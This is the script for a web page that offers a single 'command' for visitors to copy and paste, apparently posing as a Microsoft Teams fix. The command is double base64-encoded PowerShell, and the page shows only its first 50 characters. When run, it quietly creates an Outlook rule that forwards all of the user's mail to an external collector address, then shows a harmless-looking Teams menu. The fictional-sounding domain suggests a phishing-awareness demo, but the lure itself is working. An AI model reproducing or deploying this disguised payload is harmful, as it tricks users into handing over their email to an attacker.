const DISPLAY_CHAR_LIMIT = 50;
const commandPanels = document.querySelectorAll(".command-panel");
const FULL_COMMAND = atob(
  "R2V0LVByb2Nlc3MgLU5hbWUgIm1zLXRlYW1zIiwiVGVhbXMiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlfG91dC1OdWxsOyRTdHVmZiA9ICJKRzkxZEd4dmIyc2dQU0JPWlhjdFQySnFaV04wSUMxRGIyMVBZbXBsWTNRZ1QzVjBiRzl2YXk1QmNIQnNhV05oZEdsdmJnb2tjMlZ6YzJsdmJpQTlJQ1J2ZFhSc2IyOXJMbE5sYzNOcGIyNEtKSE4wYjNKbElEMGdKSE5sYzNOcGIyNHVSR1ZtWVhWc2RGTjBiM0psQ2lSeWRXeGxjeUE5SUNSemRHOXlaUzVIWlhSU2RXeGxjeWdwQ2dva2NuVnNaVTVoYldVZ1BTQWlSbTl5ZDJGeVpDQkJiR3dnVFdGcGJITWdLRTkxZEd4dmIyc2dUMjVzZVNraUNpUjBZWEpuWlhSTllXbHNJRDBnSWtKdlpYTmxRblZpWlc0dFJsZEVMVU52Ykd4bFkzUnZja0JUWTJoM2FXNW5VMk5vYkdWcFptVnlWVzVwZEdWa0xtVjFJZ29LSXlCRmVHbHpkR2x1WnlCeWRXeGxJSGRwZEdnZ2MyRnRaU0J1WVcxbElHVnVkR1psY201bGJpQW9jbTlpZFhOMElHZGxaMlZ1SUVOUFRTMUJkWE56WlhSNlpYSXBDbVp2Y2lBb0pHa2dQU0FrY25Wc1pYTXVRMjkxYm5RN0lDUnBJQzFuWlNBeE95QWthUzB0S1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNBZ0lDUnlJRDBnSkhKMWJHVnpMa2wwWlcwb0pHa3BDaUFnSUNBZ0lDQWdhV1lnS0NSdWRXeHNJQzF1WlNBa2NpQXRZVzVrSUNSeUxrNWhiV1VnTFdWeElDUnlkV3hsVG1GdFpTa2dld29nSUNBZ0lDQWdJQ0FnSUNBa2NuVnNaWE11VW1WdGIzWmxLQ1JwS1FvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLSUNBZ0lHTmhkR05vSUhzS0lDQWdJQ0FnSUNBaklHVnBibnBsYkc1bElHUmxabVZyZEdVdmRXNXNaWE5pWVhKbElGSjFiR1VnYVdkdWIzSnBaWEpsYmdvZ0lDQWdJQ0FnSUdOdmJuUnBiblZsQ2lBZ0lDQjlDbjBLQ2lNZ01DQTlJRzlzVW5Wc1pWSmxZMlZwZG1VS0pISjFiR1VnUFNBa2NuVnNaWE11UTNKbFlYUmxLQ1J5ZFd4bFRtRnRaU3dnTUNrS0NpTWdUM1YwYkc5dmF5MXZibXg1SUM4Z1kyeHBaVzUwTFc5dWJIa0tKSEoxYkdVdVEyOXVaR2wwYVc5dWN5NVBia3h2WTJGc1RXRmphR2x1WlM1RmJtRmliR1ZrSUQwZ0pIUnlkV1VLQ2lNZ1JtOXlkMkZ5WkNCaFkzUnBiMjRLSkc1MWJHd2dQU0FrY25Wc1pTNUJZM1JwYjI1ekxrWnZjbmRoY21RdVVtVmphWEJwWlc1MGN5NUJaR1FvSkhSaGNtZGxkRTFoYVd3cENpUnlkV3hsTGtGamRHbHZibk11Um05eWQyRnlaQzVTWldOcGNHbGxiblJ6TGxKbGMyOXNkbVZCYkd3b0tTQjhJRTkxZEMxT2RXeHNDaVJ5ZFd4bExrRmpkR2x2Ym5NdVJtOXlkMkZ5WkM1RmJtRmliR1ZrSUQwZ0pIUnlkV1VLQ2lSeWRXeGxMa1Z1WVdKc1pXUWdQU0FrZEhKMVpRb2tjblZzWlhNdVUyRjJaU2dwQ2dvalYzSnBkR1V0U0c5emRDQWlUM1YwYkc5dmF5MXZibXg1SUdadmNuZGhjbVFnY25Wc1pTQmpjbVZoZEdWa09pQWtjblZzWlU1aGJXVWdMVDRnSkhSaGNtZGxkRTFoYVd3aUNnb2pJRU5zWldGdWRYQWdRMDlOQ2x0MmIybGtYVnRUZVhOMFpXMHVVblZ1ZEdsdFpTNUpiblJsY205d1UyVnlkbWxqWlhNdVRXRnljMmhoYkYwNk9sSmxiR1ZoYzJWRGIyMVBZbXBsWTNRb0pISjFiR1Z6S1FwYmRtOXBaRjFiVTNsemRHVnRMbEoxYm5ScGJXVXVTVzUwWlhKdmNGTmxjblpwWTJWekxrMWhjbk5vWVd4ZE9qcFNaV3hsWVhObFEyOXRUMkpxWldOMEtDUnpkRzl5WlNrS1czWnZhV1JkVzFONWMzUmxiUzVTZFc1MGFXMWxMa2x1ZEdWeWIzQlRaWEoyYVdObGN5NU5ZWEp6YUdGc1hUbzZVbVZzWldGelpVTnZiVTlpYW1WamRDZ2tjMlZ6YzJsdmJpa0tXM1p2YVdSZFcxTjVjM1JsYlM1U2RXNTBhVzFsTGtsdWRHVnliM0JUWlhKMmFXTmxjeTVOWVhKemFHRnNYVG82VW1Wc1pXRnpaVU52YlU5aWFtVmpkQ2drYjNWMGJHOXZheWs9IjsgJHogPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRTdHVmZi5UcmltKCkpKTsgSUVYICR6IHwgb3V0LU5VbGxXcml0ZS1Ib3N0ICJTZWxlY3QgYW4gb3B0aW9uOiIgLUZvcmVncm91bmRDb2xvciBDeWFuOyBXcml0ZS1Ib3N0ICIxIC0gQ2xvc2UgUHJvZ3JhbSI7IFdyaXRlLUhvc3QgIjIgLSBDbG9zZSBQcm9ncmFtIGFuZCBTdGFydCBUZWFtcyI7ICRjPShSZWFkLUhvc3QgIkVudGVyIDEgb3IgMiIpLlRyaW0oKTsgaWYoJGMgLW5lICIxIiAtYW5kICRjIC1uZSAiMiIpe1dyaXRlLUhvc3QgIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciAxIG9yIDIuIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvd319d2hpbGUoJGMgLW5lICIxIiAtYW5kICRjIC1uZSAiMiIpOyBpZigkYyAtZXEgIjEiKXtXcml0ZS1Ib3N0ICJTdGF0dXM6IFByb2dyYW0gY2xvc2VkLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbn1lbHNle3RyeXtTdGFydC1Qcm9jZXNzICJtc3RlYW1zOiI7IFdyaXRlLUhvc3QgIlN0YXR1czogUHJvZ3JhbSBjbG9zZWQgYW5kIFRlYW1zIHN0YXJ0ZWQuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVufWNhdGNoe1dyaXRlLUhvc3QgIlN0YXR1czogQ291bGQgbm90IHN0YXJ0IFRlYW1zIGF1dG9tYXRpY2FsbHkuIiAtRm9yZWdyb3VuZENvbG9yIFJlZH19",
);

function getDisplayText(text) {
  return text.length > DISPLAY_CHAR_LIMIT
    ? `${text.slice(0, DISPLAY_CHAR_LIMIT)}...`
    : text;
}

function setCommandDisplay(commandElement) {
  if (!commandElement) {
    return;
  }

  commandElement.textContent = getDisplayText(FULL_COMMAND);
  commandElement.title = FULL_COMMAND;
}

async function copyCustomCommand(commandElement, statusElement) {
  if (!FULL_COMMAND) {
    if (statusElement) {
      statusElement.textContent = "No command found to copy.";
    }
    return;
  }

  try {
    await navigator.clipboard.writeText(FULL_COMMAND);
    if (statusElement) {
      statusElement.textContent = "Command copied to clipboard.";
    }
  } catch (error) {
    const range = document.createRange();
    range.selectNodeContents(commandElement);

    const selection = window.getSelection();
    selection.removeAllRanges();
    selection.addRange(range);

    try {
      document.execCommand("copy");
      if (statusElement) {
        statusElement.textContent = "Command copied to clipboard.";
      }
    } catch (execError) {
      if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    }

    selection.removeAllRanges();
  }
}

for (const panel of commandPanels) {
  const commandElement = panel.querySelector(".command-text");
  const copyButton = panel.querySelector(".copy-btn");
  const statusElement = panel.querySelector(".copy-status");

  setCommandDisplay(commandElement);

  if (copyButton && commandElement) {
    copyButton.addEventListener("click", () => {
      copyCustomCommand(commandElement, statusElement);
    });
  }
}
